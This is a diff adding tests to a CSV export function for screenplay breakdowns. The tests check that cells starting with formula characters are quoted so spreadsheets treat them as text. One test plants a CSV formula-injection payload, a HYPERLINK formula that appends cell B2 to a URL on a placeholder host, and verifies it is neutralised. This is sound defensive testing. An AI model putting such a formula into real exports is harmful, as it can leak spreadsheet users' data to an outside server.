@@ -134,4 +134,19 @@ describe('toCsv', () => {
     expect(csv).toBe('x\r\ny\r\n');
     expect(csv.charCodeAt(0)).not.toBe(0xfeff);
   });
+
+  it('keeps formulas out: a leading = + - @ tab or CR gets a quote in front', () => {
+    const csv = toCsv([
+      ['=SUM(A1)', '+1', '-2', '@WREN', '\tx', '\rx', '=a,b', 'plain', '', 'a=b', '-'],
+    ]);
+    expect(csv).toBe(`'=SUM(A1),'+1,'-2,'@WREN,'\tx,"'\rx","'=a,b",plain,,a=b,'-\r\n`);
+  });
+
+  it('neutralises a planted location, synopsis, and cue in the breakdown', () => {
+    const text = 'INT. =HYPERLINK("https://x/?"&B2,"Open") - DAY\n\n> +1 plan\n\n@WREN\nHi.\n';
+    const rows = rowsOf(text, screenplay);
+    const csv = toCsv([[...BREAKDOWN_COLUMNS], ...rows]);
+    expect(csv).toContain(`"'=HYPERLINK(""https://x/?""&B2,""Open"")"`);
+    expect(csv).not.toMatch(/(^|,)=/m);
+  });
 });
